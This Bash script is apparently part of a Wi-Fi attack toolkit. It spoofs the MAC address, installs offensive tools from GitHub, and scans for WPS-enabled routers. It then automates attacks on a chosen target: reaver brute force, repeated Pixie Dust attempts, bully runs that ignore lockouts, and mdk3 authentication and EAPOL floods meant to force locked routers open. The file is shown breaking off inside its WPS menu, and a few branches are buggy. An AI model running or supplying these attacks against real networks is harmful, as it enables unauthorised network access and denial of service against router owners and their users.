#! /bin/bash

WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
SCW=1
function defaults_lh3
{
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#path for keyboard shortcuts
	KSPATH=""$LPATH"/ks"
	export KSPATH
#making sure the kspath is set
	if [[ ! -d "$KSPATH" ]]
	then
		mkdir "$KSPATH"
	fi
#ALFA SUPPORT SETTING
	if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
	then
		read ALFA < "$LPATH"/settings/AWUS036ACH.txt
	else
		ALFA="no"
	fi
#yellow start 
	YS="\e[1;33m"
#blue start 
	BS="\e[0;34m"
#color end
	CE="\e[0m"
#red start
	RS="\e[1;31m"
#black start
	BLS="\e[0;30m"
#dark gray start
	DGYS="\e[1;30m"
#light blue start
	LBS="\e[1;34m"
#green start
	GNS="\e[0;32m"
#light green start
	LGNS="\e[1;32m"
#cyan start
	CYS="\e[0;36m"
#light cyan start
	LCYS="\e[1;36m"
#light red start
	DRS="\e[0;31m"
#purple start
	PS="\e[0;35m"
#light purple start
	LPS="\e[1;35m"
#brown start
	BRS="\e[0;33m"
#light gray start
	LGYS="\e[0;37m"
#white start
	WHS="\e[1;37m"
#setting custom color for logo
	if [[ -f "$LPATH"/settings/logocolor.txt ]]
	then
		read COL < "$LPATH"/settings/logocolor.txt
	else
		COL="$RS"
	fi
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return
	READAK="read -n 1"
#default MAC when starting monitor
	DEFMAC="00:11:22:33:44:55"
	
	wififb="wififb"
	
#default packets to inject per second on wps unlock with mdk3
	DPPS=400
}
function enable2_wlan
{
	echo -e "Enabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
}
function start2_menu
{
	echo -e "Enabling $WLANNM..."
	enable2_wlan
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Done"$CE"" && O1=1
	echo -e "Starting monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		ifconfig $WLANN down
		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
		ifconfig $WLANN up
	else
		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
	fi
	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
	ifconfig $WLANNM down
	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
}
function stop2_menu
{
	stop2_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Done"$CE""
}
function stop2_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		A1=0
		A2=0
		A3=0
		ifconfig $WLANN down && A1=1
		iwconfig $WLANN mode managed && A2=1
		ifconfig $WLANN up && A3=1
		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
		then
			echo -e ""$YS"Done"$CE"" && O2=1
		else
			echo -e ""$RS"Error stoping monitor mode."$CE""
		fi
	else
		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
	fi
	echo -e "Starting network-manager service..."
	service network-manager start && echo -e ""$YS"Done"$CE"" && O3=1 || echo -e ""$RS"Error starting network-manager service"$CE""
}
function install_bully
{
	if [[ -d "/root/bully" ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/bully
	fi				
	echo -e "Installing Bully"
	echo -e "Tool by Aanarchyy"
	cd
	git clone https://github.com/aanarchyy/bully.git
	cd /root/bully/src
	make
	sudo make install	
	cd	
}
function install_wifiautopwner
{
	if [[ -d "/root/WiFi-autopwner" ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/WiFi-autopwner
	fi		
	echo -e "Installing WiFi-autopwner"
	echo -e "Tool by Mi-Al"
	cd
	git clone https://github.com/Mi-Al/WiFi-autopwner.git
}
function install_vmr
{
	if [[ -d /root/mdk3-v6 || -d /root/VMR ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/mdk3-v6
		if [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]
		then
			rm /root/VMR-MDK-K2-2017R-012x2.zip
		fi
		if [[ -d /root/VMR ]]
		then
			rm -r /root/VMR
		fi
	fi
	cd
	wget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip
	unzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR
	cp -r /root/VMR/mdk3-v6 /root/
	cd /root/mdk3-v6
	make
	make install
	chmod 755 /root/mdk3-v6/*
	chmod +x /root/VMR/*.sh
	cd
}
function install_airgeddon
{
	if [[ -d "/root/airgeddon" ]]
	then
		echo -e "Removing old..."
		echo -e "$PAKTC"
		$READAK
		rm -r /root/airgeddon
	fi
	echo -e "Installing..."
	sleep 1
	echo -e "Installing Airgeddon"
	echo -e "Tool by v1s1t0r1sh3r3"
	cd
	git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
	cd airgeddon
	chmod +x airgeddon.sh
}
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function scan_wash
{
	while true
	do
	if [[ "$SCW" != 0 ]]
	then
		clear
		echo -e "Scaning in new terminal..."
		echo -e ""$YS"PRESS CTRL C IN WASH WHEN READY."$CE""
		sleep 1
		xterm -geometry 80x25+9999+9999 -T "Press Ctrl C when ready" -e "wash  -i $WLANNM | tee /root/lscript/tempwash "
	fi
		SCW=1
		clear
		wash_awk
		if [[ "$lines" = 0 ]]
		then
			echo -e ""$RS"No networks with WPS found nearby"$CE""
		fi
		echo -e ""$YS" r"$CE") Rescan"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read WASHSCAN
		if [[ "$WASHSCAN" = "r" ]]
		then
			continue
		elif [[ "$WASHSCAN" = "back" || "$WASHSCAN" = "b" ]]
		then
			SCW=0
			break
		elif [[ "$WASHSCAN" -ge 1 ]]
		then
			if [[ "$WASHSCAN" -gt "$lines" ]]
			then
				echo -e ""$RS"Wrone choice..."$CE""
				SCW=0
				sleep 2
				continue
			fi
			WASHSCAN2="${SORTED[$WASHSCAN]}"
			BSSIDT="${abssid[$WASHSCAN2]}"
			CHANT="${achannel[$WASHSCAN2]}"
			ESSIDT="${aessid[$WASHSCAN2]}"
			export BSSIDT
			export CHANT
			export ESSIDT
			if [[ ! "${alock[WASHSCAN2]}" = "No" ]]
			then
				clear
				echo -e ""$RS"This AP is locked"$CE""
				sleep 1
				SCW=0
				echo -e "Do you want to try to unlock it?"$YNYES""
				read UNW
				if [[ ! "$UNW" = "n" ]]
				then
					unlock_wps
				fi
				continue
			fi
			while true
			do
				clear
				echo -e ""$RS"----------You need strong connection------------"$CE""
				echo -e ""$YS" 1"$CE") Pixie dust                         fast"
				echo -e ""$YS" 2"$CE") Pixie loop till pin found          fast"
				echo -e ""$YS" 3"$CE") Bruteforse                         slow"
				echo -e ""$YS" 4"$CE") Bully"
				echo -e ""$YS" r"$CE") Rescan"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read WPSL
				if [[ "$WPSL" = "r" ]]
				then
					RESCAN=1
					SCW=1
					break
				elif [[ "$WPSL" = "back" || "$WPSL" = "b" ]]
				then
					RESCAN=1
					SCW=0
					break
				elif [[ "$WPSL" = "1" ]]
				then
					pixie_attack
				elif [[ "$WPSL" = "2" ]]
				then
					pixie_loop
				elif [[ "$WPSL" = "3" ]]
				then
					reaver_attack
				elif [[ "$WPSL" = "4" ]]
				then
					bully_script
				fi		
			done
			if [[ "$RESCAN" = 1 ]]
			then
				RESCAN=0
				continue
			else
				break
			fi
		else
			SCW=0
		fi
	done
}
function unlock_wps
{
while true
do
	clear
	TERMINALTITLE="WPS UNLOCK"
	dash_calc
	printf '\033]2;WPS UNLOCK\a'
	echo -e ""$BS"2 or 3 network interfaces are recommended for this attack"$CE""
	echo -e ""
	if [[ "$INTS" = "" ]]
	then
		INTS=1
	fi
	echo -e ""$YS"set"$CE") Set your interface(s)                   Current:"$INTS""
	echo -e ""$YS" ch"$CE") Check if unlocked"
	#~ echo -e ""$YS"  t"$CE") Set attack's timeout                    Current:"$TM" secs"
	echo -e ""$BS"Attacks:"$CE""
	echo -e ""$YS" 1"$CE") DOS flood"
	echo -e ""$YS" 2"$CE") EAPOL start flood"
	#~ echo -e ""$YS" 3"$CE") Cause Michael failure (only TKIP / AES+TKIP)"
	#~ echo -e ""$YS" 4"$CE") "
	echo -e ""$YS" b"$CE") Go back"
	echo -e "Choose:"
	read UNL
	clear
	if [[ "$UNL" = "b" || "$UNL" = 00 || "$UNL" = 0 ]]
	then
		break
	elif [[ "$UNL" = "ch" || "$UNL" = "c" ]]
	then
		#~ xterm -T "Check if unlocked" -e 'wash -i $WLANNM | grep "$ESSIDT" | awk "{FS=" "} {print $5}" | tee /root/wa.txt'
		#~ T1=$(wash -i $WLANNM | grep "$ESSIDT" | awk -F ' ' '{print $5}')
		#~ if [[ "$T1" == "Yes" ]]
		#~ then
			#~ echo -e ""$RS"Still locked"$CE""
		#~ else
			#~ echo -e ""$YS"Unlocked!!!"$CE""
		#~ fi
		xterm -T "Check if unlocked" -e 'wash -i $WLANNM' & disown
	elif [[ "$UNL" = "1" ]]
	then
		n=0
		while true
		do
			if [[ "$n" = 0 ]]
			then
				xterm -T "DOS flood on $WLANNM" -hold -e 'mdk3 $WLANNM a -a $BSSIDT -m && echo -e "" && echo -e "Close this window manually"' & disown
				n=$((n+1))
				continue
			else
				if [[ "$n" != "$INTS" ]]
				then
					CURIN="${NI[$n]}"
					if [[ "$CURIN" = "" ]]
					then
						echo -e ""$RS"Error 15. Interface not found."$CE""
						sleep 3
					else
						xterm -T "DOS flood on $CURIN" -hold -e 'mdk3 $CURIN a -a $BSSIDT -m && echo -e "" && echo -e "Close this window manually"' & disown
					fi
				else
					break
				fi
			fi
			n=$((n+1))
		done
	elif [[ "$UNL" = "2" ]]
	then
		echo -e "Packets to inject per second:("$YS"Enter"$CE"="$DPPS")"
		read PPS
		if [[ "$PPS" = "" ]]
		then
			PPS="$DPPS"
		fi
		if [[ "$PPS" -le 0 ]]
		then
			echo -e ""$RS"Wrong choice"$CE""
			sleep 2
			continue
		fi
		export PPS
		n=0
		OFSET=-20
		while true
		do
			OFSET=$((OFSET+20))
			export OFSET
			if [[ "$n" = 0 ]]
			then
				xterm -T "EAPOL start flood on $WLANNM" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $WLANNM x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
				n=$((n+1))
				continue
			else
				if [[ "$n" != "$INTS" ]]
				then
					CURIN="${NI[$n]}"
					export CURIN
					if [[ "$CURIN" = "" ]]
					then
						echo -e ""$RS"Error 16. Interface not found."$CE""
						sleep 3
					else
						xterm -T "EAPOL start flood on $CURIN" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
					fi
				else
					break
				fi
			fi
			n=$((n+1))
		done
	elif [[ "$UNL" = "set" ]]
	then
		while true
		do
			clear
			echo -e ""$BS"Current interface number"$CE": "$INTS""
			echo -e ""$YS" a"$CE") Add another interface"
			echo -e ""$YS" r"$CE") Reset interfaces"
			echo -e ""$YS" b"$CE") Go back"
			read NIN
			clear
			if [[ "$NIN" = "b" || "$NIN" = 00 ]]
			then
				break
			elif [[ "$NIN" = "r" ]]
			then
				while true
				do
					newints=$((INTS-1))
					if [[ "$newints" -lt 1 ]]
					then
						echo -e ""$RS"No interfaces added to reset"$CE""
						sleep 2
						break
					else
						INTS=1
						break
					fi
				done
			elif [[ "$NIN" = "a" ]]
			then
				echo -e "New interface: "
				read NII
				TEST3=$(ifconfig | grep "$NII")
				if [[ "$TEST3" = "" ]]
				then
					echo -e ""$RS"Could not find this interface on your system"$CE""
					sleep 3
				else
					echo -e ""$BS"Interface found!"$CE""
					sleep 2
					clear
					checkmonitor=$(iwconfig "$NII" | grep "Mode:Monitor")
					if [[ "$checkmonitor" = "" ]]
					then
						echo -e ""$BS"Enabling monitor mode for "$NII"..."
						airmon-ng start $NII | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE""
						checkmonitor=$(iwconfig "$NII"mon | grep "Mode:Monitor")
						if [[ "$checkmonitor" = "" ]]
						then
							echo -e ""$RS"Couldn't start monitor mode"$CE""
							sleep 2
							continue
						fi
					fi
					z=1
					l=0
					while [[ "$z" -le "$INTS" ]]
					do
						if [[ "$NII" == "${NI[$z]}" || "$NII" == "$WLANNM" ]]
						then
							echo -e ""$RS"Interface already set"$CE""
							sleep 2
							l=1
						fi
						z=$((z+1))
					done
					if [[ "$l" = 1 ]]
					then
						continue
					fi
					NI[$INTS]="$NII"
					INTS=$((INTS+1))
				fi
			fi
		done
	fi
done
}
function reaver_attack
{
	clear
	TERMINALTITLE="WPS BRUTEFORCE"
	dash_calc
	printf '\033]2;WPS BRUTEFORCE\a'
	echo -e "Delay between every attempt("$YS"Enter"$CE"=60): "
	read DELAY
	if [[ "$DELAY" = "" ]]
	then
		DELAY=60
	fi
	#xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/lscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read	
}
function pixie_loop
{
	clear
	TERMINALTITLE="PIXIE LOOP ATTACK"
	dash_calc
	printf '\033]2;PIXIE LOOP ATTACK\a'
	echo -e "Delay between every attempt("$YS"Enter"$CE"=15): "
	read DELAY
	if [[ "$DELAY" = "" ]]
	then
		DELAY=15
	elif [[ ! "$DELAY" -ge 0 ]]
	then
		DELAY=0
	fi
	while true
	do
		trap 'break' SIGINT
		echo "" > "$LPATH"/wpslogloop
		reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -K 1 -f -vvv <<< $'y\n' | tee /root/lscript/wpslogloop
		if [[ -f "$LPATH"/wpslog ]]
		then
			TTT=$(cat "$LPATH"/wpslogloop | grep "WPS pin not found!")
			TTTT=$(cat "$LPATH"/wpslogloop | grep "WPS pin:    <empty>")
			TTT2=$(cat "$LPATH"/wpslogloop | grep "found")
			TTT3=$(cat "$LPATH"/wpslogloop | grep "WPA")
			if [[ "$TTT" != "" || "$TTTT" != "" ]]
			then
				echo -e ""$RS"Pin not found. Retrying..."$CE""
			elif [[ "$TTT2" != "" || "$TT3" != "" ]]
			then
				echo -e ""$YS"Pin found!!"$CE""
				cp "$LPATH"/wpslog >> "$LPATH"/wpslog
				sleep 2
				break
			else
				echo -e ""$RS"Pin not found. Retrying..."$CE""
			fi
			if [[ "$DELAY" -gt 1 ]]
			then
				echo -e "Waiting "$DELAY" seconds..."
			elif [[ "$DELAY" = 1 ]]
			then
				echo -e "Waiting "$DELAY" second..."
			fi
			sleep $DELAY
		else
			echo -e ""$RS"Error 10. Could not locate wpslogloop file."$CE""
			sleep 4
			break
		fi
	done
	trap - SIGINT
	echo -e "Press "$YS"enter"$CE" to go back"
	read
	
}
function pixie_attack
{
	clear
	TERMINALTITLE="PIXIE DUST ATTACK"
	dash_calc
	printf '\033]2;PIXIE DUST ATTACK\a'
	#xterm -geometry 90x70+0+0 -e "aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/lscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read
}
function reaver_wpastart
{
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -p $WPST -L -f -g 1 -d 2 -vvv
	echo -e "$PAKTC"
	read
}
function associate_aireplay
{
	echo -e "Enter your target's BSSID: "
	read -e BSSIDT
	export BSSIDT
	export -f aireplay_command
	xterm -e bash -c 'aireplay_command; exec bash'
	clear
	exec bash "$0"
}
#~ function wash_awk
#~ {
#~ file="/root/lscript/tempwash"
#~ linestotal=$(cat $file | awk 'END{print NR}')
#~ lines=$((linestotal-7))
#~ n=1
#~ if [[ "$lines" != 0 ]]
#~ then
	#~ echo -e "    BSSID             CH ESSID"
#~ fi
#~ while [ $n -le "$lines" ]
#~ do
	#~ nnn=$((n+7))
	#~ nnum[$n]=$nnn
	#~ abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
	#~ achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
	#~ aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $7}')
	#~ ti=7
	#~ while true
	#~ do
		#~ essidtest=$(cat $file | awk -v nn="$nnn" -v po="$ti" '{if(NR==nn)print $po}')
		#~ if [[ "$essidtest" != "" ]]
		#~ then
			#~ aessid[$nnn]="${aessid[$nnn]} $essidtest"
		#~ else
			#~ break
		#~ fi
		#~ ti=$((ti+1))
	#~ done
	#~ alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
	#~ if [[ ! ${alock[$nnn]} = "No" ]]
	#~ then
		#~ locked="$RS"
	#~ else
		#~ locked="$YS"
	#~ fi
	#~ size=${#achannel[$nnn]}
	#~ if [[ "$n" -le 9 ]]
	#~ then
		#~ if [[ "$size" = 2 ]]
		#~ then
			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
		#~ else
			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
		#~ fi
	#~ else
		#~ if [[ "$size" = 2 ]]
		#~ then
			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
		#~ else
			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
		#~ fi
	#~ fi
	#~ n=$(( n+1 ))
#~ done
#~ }

function wash_awk
{
file="/root/lscript/tempwash"
linestotal=$(cat $file | awk 'END{print NR}')
lines=$((linestotal-2))
n=1
if [[ "$lines" != 0 ]]
then
	echo -e "    BSSID             CH PR ESSID"
fi
while [[ "$n" -le "$lines" ]]
do
	nnn=$((n+2))
	nnum[$n]=$nnn
	abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
	achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
	apower[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $3}' | cut -d '-' -f2)
	tempn=${apower[$nnn]}
	apower[$nnn]=$((100-tempn))
	if [[ ${apower[$nnn]} -lt 10 ]]
	then
		apower[$nnn]="${apower[$nnn]} "
	fi
	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $7 " " $8 " " $9 " " $10 " " $11 " " $12}')
	ti=7
	#~ while true
	#~ do
		#~ essidtest=$(cat $file | awk -v nn="$nnn" -v po="$ti" '{if(NR==nn)print $po}')
		#~ echo "Total = $essidtest"
		#~ if [[ "$essidtest" != "" ]]
		#~ then
			#~ aessid[$nnn]="${aessid[$nnn]} $essidtest"
		#~ else
			#~ break
		#~ fi
		#~ ti=$((ti+1))
	#~ done
	alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
	n=$(( n+1 ))
done
##sorting them according to the power:
n=1
while [[ "$n" -le "$lines" ]]
do
	#~ nnn=$((n+2))
	#~ size=${#achannel[$nnn]}
	#~ if [[ ! ${alock[$nnn]} = "No" ]]
	#~ then
		#~ locked="$RS"
	#~ else
		#~ locked="$YS"
	#~ fi
	#~ if [[ "$n" -le 9 ]]
	#~ then
		#~ if [[ "$size" = 2 ]]
		#~ then
			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
		#~ else
			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
		#~ fi
	#~ else
		#~ if [[ "$size" = 2 ]]
		#~ then
			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
		#~ else
			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
		#~ fi
	#~ fi
	n2=1
	VALUE=0
	while [[ "$n2" -le "$lines" ]]
	do
		if [[ "${apower[${nnum[$n2]}]}" -ge "$VALUE" ]]
		then
			VALUE=${apower[${nnum[$n2]}]}
			NUM=${nnum[$n2]}
		fi
		n2=$((n2+1))	
	done
	SORTED[$n]=$NUM
	SORTEDPR[$n]=$VALUE
	apower[$NUM]="-1"
	n=$((n+1))
done
n=1
while [[ "$n" -le "$lines" ]]
do
	#size=${#achannel[${nnum[$n]}]}
	if [[ ! ${alock[${nnum[$n]}]} = "No" ]]
	then
		locked="$RS"
	else
		locked="$YS"
	fi
	if [[ "$n" -le 9 ]]
	then
		if [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]
		then
			echo -e " "$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
		else
			echo -e " "$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
		fi
	else
		if [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]
		then
			echo -e ""$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
		else
			echo -e ""$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
		fi
	fi
	n=$((n+1))
done
}
function bully_script
{
TERMINALTITLE="BULLY AUTOMATION"
dash_calc
printf '\033]2;BULLY AUTOMATION\a'
while true
do
	clear
	if [[ "$BRUTE" = "" ]]
	then
		BRUTE="OFF"
	fi
	if [[ "$FORCE" = "" ]]
	then
		FORCE="OFF"
	fi
	if [[ "$PIXIE" = "" ]]
	then
		PIXIE="ON"
	fi
	if [[ "$SEQ" = "" ]]
	then
		SEQ="OFF"
	fi
	if [[ "$VERBOSITY" = "" ]]
	then
		VERBOSITY=3
	fi
	if [[ "$IGNORELOCKOUT" = "" ]]
	then
		IGNORELOCKOUT="OFF"
	fi
	if [[ "$LOCKWAIT" = "" ]]
	then
		LOCKWAIT=60
	fi
	if [[ "$WAITPERATTEMPT" = "" ]]
	then
		WAITPERATTEMPT=0
	fi
	if [[ "$BSSIDT" = "" || "$ESSIDT" = "" || "$CHANT" = "" ]]
	then
		OK=0
	else
		OK=1
	fi
	echo -e ""$YS" 1"$CE") Essid                       CURRENT:"$ESSIDT""
	echo -e ""$YS" 2"$CE") Bssid                       CURRENT:"$BSSIDT""
	echo -e ""$YS" 3"$CE") Channel                     CURRENT:"$CHANT""
	echo -e ""$YS" 4"$CE") Bruteforce Checksum digit   CURRENT:"$BRUTE""
	echo -e ""$YS" 5"$CE") Pixie wps                   CURRENT:"$PIXIE""
	echo -e ""$YS" 6"$CE") Wait after lock             CURRENT:"$LOCKWAIT" secs"
	echo -e ""$YS" 7"$CE") Wait per attempt            CURRENT:"$WAITPERATTEMPT" secs"
	echo -e ""$YS" 8"$CE") Force                       CURRENT:"$FORCE""
	echo -e ""$YS" 9"$CE") Sequential                  CURRENT:"$SEQ""
	echo -e ""$YS"10"$CE") Verbosity                   CURRENT:"$VERBOSITY""
	echo -e ""$YS"11"$CE") Ignore lockout              CURRENT:"$IGNORELOCKOUT""
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"start"$CE") Start"
	echo -e "Choose: "
	read B
	clear
	if [[ "$B" = "back" || "$B" = "b" ]]
	then
		clear
		break
	elif [[ "$B" = "start" ]]
	then
		if [[ "$OK" = 0 ]]
		then
			echo -e ""$RS"Error 1"$CE""
			sleep 3
		else
			if [[ "$BRUTE" = "ON" ]]
			then
				LBRUTE="-B"
			else
				LBRUTE=""
			fi
			if [[ "$PIXIE" = "ON" ]]
			then
				LPIXIE="-d"
			else
				LPIXIE=""
			fi
			if [[ "$FORCE" = "ON" ]]
			then
				LFORCE="-F"
			else
				LFORCE=""
			fi
			if [[ "$SEQ" = "ON" ]]
			then
				LSEQ="-S"
			else
				LSEQ=""
			fi
			LVERBOSITY="-v $VERBOSITY"
			if [[ "$IGNORELOCKOUT" = "ON" ]]
			then
				LIGNORELOCKOUT="-L"
			else
				LIGNORELOCKOUT=""
			fi
			bully -b $BSSIDT -e $ESSIDT -c $CHANT -v $VERBOSITY -l $LOCKWAIT -1 $WAITPERATTEMPT,1 $LFORCE $LSEQ $LBRUTE $LPIXIE $LIGNORELOCKOUT $WLANNM
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$B" = 1 ]]
	then
		echo -e "Essid:"
		read ESSIDT
	elif [[ "$B" = 2 ]]
	then
		echo -e "Bssid:"
		read BSSIDT
	elif [[ "$B" = 3 ]]
	then
		echo -e "Channel:"
		read CHANT
	elif [[ "$B" = 4 ]]
	then
		if [[ "$BRUTE" = "ON" ]]
		then
			BRUTE="OFF"
		else
			BRUTE="ON"
		fi
	elif [[ "$B" = 5 ]]
	then
		if [[ "$PIXIE" = "ON" ]]
		then
			PIXIE="OFF"
		else
			PIXIE="ON"
		fi
	elif [[ "$B" = 6 ]]
	then
		echo -e "Wait after lock(in seconds): "
		read LOCKWAIT
	elif [[ "$B" = 7 ]]
	then
		echo -e "Wait per attempt(in seconds): "
		read WAITPERATTEMPT
	elif [[ "$B" = 8 ]]
	then
		if [[ "$FORCE" = "ON" ]]
		then
			FORCE="OFF"
		else
			FORCE="ON"
		fi
	elif [[ "$B" = 9 ]]
	then
		if [[ "$SEQ" = "ON" ]]
		then
			SEQ="OFF"
		else
			SEQ="ON"
		fi
	elif [[ "$B" = 10 ]]
	then
		while true
		do
			echo -e "Verbosity (1-4): "
			read VERB
			clear
			if [[ "$VERB" = 1 || "$VERB" = 2 || "$VERB" = 3 || "$VERB" = 4 ]]
			then
				VERBOSITY="$VERB"
				break
			else
				echo -e "Number must be 1,2,3 or 4"
				sleep 3
			fi			
		done
	elif [[ "$B" = 11 ]]
	then
		if [[ "$IGNORELOCKOUT" = "ON" ]]
		then
			IGNORELOCKOUT="OFF"
		else
			IGNORELOCKOUT="ON"
		fi
	fi
	
done
}
function main_wps_options
{
while true
do
clear
TERMINALTITLE="WPS MENU"
dash_calc
printf '\033]2;WPS MENU\a'
if [[ "$ESSIDT" = "" ]]
then
	echo -e ""$YS" 1"$CE") Scan with wash              Selected: "$RS"None"$CE""
else
	echo -e ""$YS" 1"$CE") Scan with wash              Selected: "$YS"$ESSIDT"$CE""
fi
echo -e ""$YS" 2"$CE") Reaver bruteforce"
echo -e ""$YS" 3"$CE") Reaver                      (if you already have the WPS pin)"
echo -e ""$YS" 4"$CE") Pixie Dust"
echo -e ""$YS" 5"$CE") Pixie loop till pin found"
if [[ -f /usr/bin/bully ]]
then
	echo -e ""$YS" 6"$CE") Bully                       AUTOMATED SCRIPT"
	echo -e ""$YS" 7"$CE") Bully"
else
	echo -e ""$RS" 6"$CE") "$RS"Bully"$CE"                        AUTOMATED SCRIPT"
	echo -e ""$RS" 7"$CE") "$RS"Bully"$CE""
fi
if [[ -d /root/WiFi-autopwner ]]
then
	echo -e ""$YS" 8"$CE") WiFi autopwner"
else
	echo -e ""$RS" 8"$CE") "$RS"WiFi autopwner"$CE""
fi
if [[ -d /root/airgeddon ]]
then
	echo -e ""$YS" 9"$CE") Airgeddon"
else
	echo -e ""$RS" 9"$CE") "$RS"Airgeddon"$CE""
fi
if [[ -d /root/VMR ]]
then
	echo -e ""$YS"10"$CE") VMR"
else
	echo -e ""$RS"10"$CE") "$RS"VMR"$CE""
fi
